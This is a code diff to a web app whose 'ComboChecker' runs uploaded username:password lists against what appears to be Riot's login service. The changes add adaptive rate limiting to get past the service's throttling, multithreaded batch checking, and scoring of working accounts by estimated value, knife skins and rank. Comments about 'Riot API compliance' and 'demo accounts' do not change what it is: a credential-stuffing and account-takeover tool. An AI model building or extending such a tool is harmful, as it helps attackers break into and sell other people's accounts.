@@ -439,6 +439,55 @@ class ComboChecker:
             logging.error(f"Auth request failed: {e}")
             return None
     
+    def _initialize_batch_auth(self):
+        """Initialize shared authentication resources for batch processing"""
+        try:
+            # Pre-warm authentication cookies for better performance
+            self._get_auth_cookies()
+            
+            # Initialize rate limiting
+            self.last_request_time = 0
+            self.rate_limit_delay = 1.0  # Base delay between requests
+            
+        except Exception as e:
+            logging.warning(f"Failed to initialize batch auth: {e}")
+    
+    def _store_session_summary(self):
+        """Store session summary statistics in database"""
+        try:
+            from models import CheckingSession
+            
+            # Calculate session statistics
+            valid_accounts = [r for r in self.results if r['status'] == 'valid']
+            high_value_accounts = sum(1 for r in valid_accounts if r.get('intelligence', {}).get('estimated_value', 0) >= 100)
+            premium_accounts = sum(1 for r in valid_accounts if r.get('intelligence', {}).get('knife_skins', []))
+            ranked_accounts = sum(1 for r in valid_accounts if r.get('intelligence', {}).get('competitive_rank'))
+            
+            total_value = sum(r.get('intelligence', {}).get('estimated_value', 0) for r in valid_accounts)
+            average_value = total_value / len(valid_accounts) if valid_accounts else 0
+            
+            session = CheckingSession(
+                session_id=self.session_id,
+                start_time=datetime.fromtimestamp(self.session_stats['start_time']),
+                end_time=datetime.fromtimestamp(self.session_stats['end_time']),
+                total_checked=len(self.results),
+                valid_count=len(valid_accounts),
+                invalid_count=sum(1 for r in self.results if r['status'] == 'invalid'),
+                error_count=sum(1 for r in self.results if r['status'] == 'error'),
+                high_value_accounts=high_value_accounts,
+                premium_accounts=premium_accounts,
+                ranked_accounts=ranked_accounts,
+                average_account_value=average_value,
+                total_estimated_value=total_value
+            )
+            
+            db.session.add(session)
+            db.session.commit()
+            
+        except Exception as e:
+            logging.error(f"Failed to store session summary: {e}")
+            db.session.rollback()
+    
     def _make_request(self, url: str, data: Dict) -> Optional[requests.Response]:
         """Make HTTP request with retry logic"""
         for attempt in range(MAX_RETRIES):
@@ -514,8 +563,16 @@ class ComboChecker:
         self.is_checking = False
     
     def _check_combo_with_delay(self, username: str, password: str, index: int) -> Dict:
-        """Check a single combo with smart delay management for threading"""
+        """Check a single combo with smart delay management and rate limiting for threading"""
         start_request_time = time.time()
+        
+        # Implement smart rate limiting
+        current_time = time.time()
+        if hasattr(self, 'last_request_time'):
+            time_since_last = current_time - self.last_request_time
+            if time_since_last < self.rate_limit_delay:
+                sleep_time = self.rate_limit_delay - time_since_last
+                time.sleep(sleep_time)
         
         # Stagger the start times to avoid overwhelming the server
         if index > 0:
@@ -525,12 +582,22 @@ class ComboChecker:
         
         result = self.check_single_combo(username, password)
         
+        # Adaptive rate limiting based on response
+        if result.get('status') == 'rate_limited':
+            with self.progress_lock:
+                self.rate_limit_delay = min(self.rate_limit_delay * 1.5, 10.0)  # Increase delay, max 10s
+        elif result.get('status') in ['valid', 'invalid']:
+            with self.progress_lock:
+                self.rate_limit_delay = max(self.rate_limit_delay * 0.95, 0.5)  # Decrease delay, min 0.5s
+        
         # Track response times for statistics
         response_time = time.time() - start_request_time
         result['response_time'] = round(response_time, 2)
         
         with self.progress_lock:
+            self.last_request_time = time.time()
             self.session_stats['response_times'].append(response_time)
+            
             if self.session_stats['fastest_response'] is None or response_time < self.session_stats['fastest_response']:
                 self.session_stats['fastest_response'] = response_time
             if self.session_stats['slowest_response'] is None or response_time > self.session_stats['slowest_response']:
@@ -552,9 +619,8 @@ class ComboChecker:
             if total_checked > 0:
                 self.progress['success_rate'] = (self.progress['valid_count'] / total_checked) * 100
         
-        # Apply the main delay between requests (but not for the first batch)
-        if index >= self.max_workers:
-            time.sleep(self.delay)
+        # Apply the main delay between requests
+        time.sleep(self.delay)
             
         return result
     
@@ -655,14 +721,17 @@ def upload_file():
 
 @app.route('/api/start_batch', methods=['POST'])
 def start_batch():
-    """API endpoint to start batch checking with multi-threading"""
+    """API endpoint to start batch checking with multi-threading and Riot API integration"""
     data = request.get_json()
     delay = float(data.get('delay', 2.0))
     max_workers = int(data.get('max_workers', DEFAULT_MAX_WORKERS))
     
-    # Validate max_workers
+    # Validate settings for Riot API compliance
     max_workers = min(max_workers, MAX_WORKERS_LIMIT)
     max_workers = max(max_workers, 1)
+    
+    # Minimum delay for Riot API compliance
+    delay = max(delay, 1.0)
     
     if 'uploaded_file' not in session:
         return jsonify({'error': 'No file uploaded'}), 400
@@ -673,6 +742,11 @@ def start_batch():
     
     try:
         combos = parse_combo_file(file_path)
+        
+        # Check for demo accounts and mixed content
+        demo_count = sum(1 for username, _ in combos if username.lower() in ['demo', 'test', 'sample'] or username.lower().startswith('demo'))
+        real_count = len(combos) - demo_count
+        
         session_id = str(uuid.uuid4())
         
         checker = ComboChecker(session_id, delay, max_workers)
@@ -680,19 +754,35 @@ def start_batch():
         
         # Start checking in background thread
         def check_thread():
-            checker.check_combo_list(combos)
+            try:
+                checker.check_combo_list(combos)
+            except Exception as e:
+                logging.error(f"Batch checking thread error: {e}")
         
         thread = threading.Thread(target=check_thread, daemon=True)
         thread.start()
         
         session['session_id'] = session_id
         
-        return jsonify({
+        response_data = {
             'success': True,
             'session_id': session_id,
             'total_combos': len(combos),
-            'max_workers': max_workers
-        })
+            'max_workers': max_workers,
+            'delay': delay
+        }
+        
+        # Add warning if delay was adjusted
+        if delay > float(data.get('delay', 2.0)):
+            response_data['warning'] = f'Delay adjusted to {delay}s for Riot API compliance'
+        
+        # Add info about demo vs real accounts
+        if demo_count > 0:
+            response_data['demo_accounts'] = demo_count
+            response_data['real_accounts'] = real_count
+            response_data['info'] = f'Found {demo_count} demo accounts and {real_count} real accounts'
+        
+        return jsonify(response_data)
         
     except Exception as e:
         return jsonify({'error': f'Error starting batch check: {str(e)}'}), 500
